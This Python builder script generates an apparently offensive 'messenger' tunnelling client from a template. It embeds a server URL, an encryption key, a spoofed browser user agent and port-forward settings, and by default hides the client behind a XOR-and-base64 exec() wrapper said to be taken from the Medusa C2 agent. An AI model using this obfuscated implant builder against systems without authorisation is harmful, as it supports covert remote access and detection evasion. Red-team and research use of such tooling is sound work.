import argparse
import hashlib
import os
import base64
import textwrap

from itertools import cycle
from pathlib import Path
from jinja2 import Environment, FileSystemLoader, select_autoescape

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

def add_arguments(parser):
    builder = parser.add_argument_group("Builder options")
    builder.add_argument("--name", default="client.py",
                     help="Name of the output.")
    builder.add_argument(
        "--non-main-thread",
        action="store_true",
        help="Run client from a non-main thread destination (not CTRL+C-safe for websockets).",
    )
    builder.add_argument(
        "--no-obfuscate",
        action="store_true",
        help="Don't obfuscate the client.",
    )

    cfg = parser.add_argument_group("Client configuration")
    cfg.add_argument("--server-url", default="ws://localhost:8080",
                     help="Server URL the client should connect to.")
    cfg.add_argument("-e", "--encryption-key", default="",
                     help="AES encryption key to embed (optional).")
    cfg.add_argument("--user-agent", default=USER_AGENT,
                     help="Custom HTTP/WebSocket User-Agent string (optional).")
    cfg.add_argument("--proxy", default="",
                     help="Proxy to use (optional).")
    cfg.add_argument("--remote-port-forwards", nargs="*", default=[],
                     help="Space delimited remote port forwards LISTENING-IP:LISTENING-PORT:REMOTE-IP:REMOTE-PORT (optional).")

    retry = parser.add_argument_group("Retry behavior")
    retry.add_argument("--retry-duration", type=float, default=60.0,
                       help="Total time to retry connecting.")
    retry.add_argument("--retry-attempts", type=int, default=5,
                       help="Number of retry attempts before giving up.")


def build(args):
    template_name = "messenger-client.py"

    template_dir = Path(__file__).resolve().parent / "templates"
    if not template_dir.is_dir():
        raise RuntimeError(f"Template directory not found: {template_dir}")

    env = Environment(
        loader=FileSystemLoader(str(template_dir)),
        autoescape=select_autoescape(enabled_extensions=("j2",)),
        trim_blocks=True,
        lstrip_blocks=True,
    )

    template = env.get_template(template_name)

    rendered = template.render(**vars(args))

    if not args.no_obfuscate:
        # Stole this from Medusa https://github.com/MythicAgents/Medusa/blob/cdc3127aa8d531c6477b0c36e26f4bbe540b72cc/Payload_Type/medusa/medusa/mythic/agent_functions/builder.py#L151
        key = hashlib.md5(os.urandom(128)).hexdigest().encode()
        encrypted_content = ''.join(chr(c ^ k) for c, k in zip(rendered.encode(), cycle(key))).encode()
        b64_enc_content = base64.b64encode(encrypted_content)
        xor_func = "chr(c^k)"
        rendered = textwrap.dedent("""\
        import base64, itertools
        exec(''.join({} for c,k in zip(base64.b64decode({}), itertools.cycle({}))).encode())\
        """).format(xor_func, b64_enc_content, key)

    out_path = Path(args.name)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(rendered, encoding="utf-8")

    print("[+] Wrote Python client to '{}'".format(out_path))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(usage=argparse.SUPPRESS)
    add_arguments(parser)
    parsed_args = parser.parse_args()
    build(parsed_args)